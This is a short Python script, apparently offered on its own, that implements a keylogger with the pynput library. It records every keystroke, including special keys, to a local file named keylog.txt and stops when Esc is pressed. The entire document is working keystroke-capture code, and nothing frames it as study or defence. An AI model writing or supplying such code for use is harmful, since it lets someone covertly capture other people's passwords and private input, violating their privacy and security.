from pynput.keyboard import Key, Listener

# Function to write keystrokes to a log file
def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., shift, ctrl, etc.)
        with open("keylog.txt", "a") as f:
            f.write(f" {key} ")

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

